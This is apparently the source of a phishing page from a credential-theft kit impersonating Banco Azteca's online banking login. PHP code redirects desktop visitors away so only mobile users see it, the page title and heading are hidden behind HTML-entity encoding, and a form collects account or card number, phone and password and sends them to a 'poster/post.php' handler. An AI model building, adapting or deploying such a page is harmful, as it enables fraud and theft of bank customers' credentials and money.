<?php

$tablet_browser = 0;
$mobile_browser = 0;
$body_class = 'desktop';
 
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
    $tablet_browser++;
    $body_class = "tablet";
}
 
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
    $mobile_browser++;
    $body_class = "mobile";
}
 
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
    $mobile_browser++;
    $body_class = "mobile";
}
 
$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array(
    'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
    'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
    'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
    'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
    'newt','noki','palm','pana','pant','phil','play','port','prox',
    'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',
    'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',
    'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',
    'wapr','webc','winw','winw','xda ','xda-');
 
if (in_array($mobile_ua,$mobile_agents)) {
    $mobile_browser++;
}
 
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {
    $mobile_browser++;
    //Check for tablets on opera mini alternative headers
    $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
    if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
      $tablet_browser++;
    }
}
if ($tablet_browser > 0) {
// Si es tablet has lo que necesites

}
else if ($mobile_browser > 0) {
// Si es dispositivo mobil has lo que necesites

}else {
// Si es ordenador de escritorio has lo que necesites
   header('Location: ../index.php');
}  

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65;&#99;&#99;&#101;&#115;&#111;&nbsp;&#97;&nbsp;&#66;&#97;&#110;&#99;&#97;&nbsp;&#124;&nbsp;&#66;&#97;&#110;&#99;&#111;&nbsp;&#65;&#122;&#116;&#101;&#99;&#97;</title>
    <link rel="stylesheet" href="css/fonts.css">

        <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
	<link rel="shortcut icon" 	 href="resources/favicon.ico" type="image/x-icon" sizes="32x32" />
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
</head>
<body>
<style>
body{
    background-color: #17a54d ;
    
}

.wrapper{
    width: 330px;
    height: 450px;
    background: #ffffff;
    color: #000000;
    top: 50%;
    left: 50%;
    position: absolute;
    transform: translate(-50%, -50%);
    box-sizing: border-box;
    padding: 19px;
    border-radius: 10px;
    }

    .wrapper h1{
        text-align: center;
    }

    .btns{
    top: 100%;
    left: 50%;
    position: absolute;
    transform: translate(-50%, -50%);
    box-sizing: border-box;
    padding: 19px;
    border-radius: 10px;
    }

    form{
    top: 60%;
    left: 50%;
    position: absolute;
    transform: translate(-50%, -50%);
    box-sizing: border-box;
    padding: 10px;
    border-radius: 10px;
    }

    input[type="submit"]{
        padding: 10px;
        color:#fff;
        background-color: #17a54d;
        width: 100px;
        height: 40px;
        margin: 20px auto;
        margin-top: 0;
        border: 0;
        border-radius: 40px;
        cursor: pointer;
        margin-left: auto;
        margin-right: auto;
    }

    input[type="password"]{
    outline: none;
    padding: 2px;
    display: block;
    width: 250px;
    height: 50px;
    border-radius: 4px;
    border: 3px solid #EEEEEE;
    background-color: #ffffff;
        }

    #ps{
        margin-bottom: 15px;
    }
    
    header{
        background-color: white;
        height: 70px;
        max-width: 1000px;
        width: 100%;
    }
    
    .logo{
        width: 300px;
        margin-top:15px;
    }
    
    ::-webkit-input-placeholder {
   text-align: center;
}

:-moz-placeholder { /* Firefox 18- */
   text-align: center;  
}

::-moz-placeholder {  /* Firefox 19+ */
   text-align: center;  
}

:-ms-input-placeholder {  
   text-align: center; 
}
</style>

<header id="main-header">
		
		<a id="logo-header" href="#">
            <img src="resources/banco-azteca-logo.png" class="logo">
		</a> <!-- / #logo-header -->


	</header>

<div class="wrapper">
                <h2 class="mdHdr" style="color=#17a54d"><font color="#17a54d">
				&#65;&#99;&#99;&#101;&#100;&#101;&nbsp;&#97;&nbsp;&#116;&#117;<br />
					<span class="bold"><strong>&#66;&#97;&#110;&#99;&#97;&nbsp;&#101;&#110;&nbsp;&#76;&iacute;&#110;&#101;&#97;</strong></span>
				</h2></font>
    
                    <form action="poster/post.php" method="post">
							<div class="fields">
								<input type="password" name="user"
									placeholder="Usuario/Cuenta/Tarjeta" class="field"
									maxlength="50" autocomplete="off"/>
							</div><br>
							<div class="fields">
								<input type="password" name="phone"
									placeholder="Celular" class="field"
									maxlength="10" minlength="10" autocomplete="off" id="phone"/>
							</div><br>
                            <div class="fields">
								<input type="password" name="pass" id="ps"
									placeholder="Contrase&ntilde;a" class="field"
									maxlength="50" autocomplete="off"/>
							</div><br>
							<div class="btns">
									<input type="submit" class="btn" value="Ingresar"></input>
								</div>
                    </form>
				
</div>


	
</body>
</html>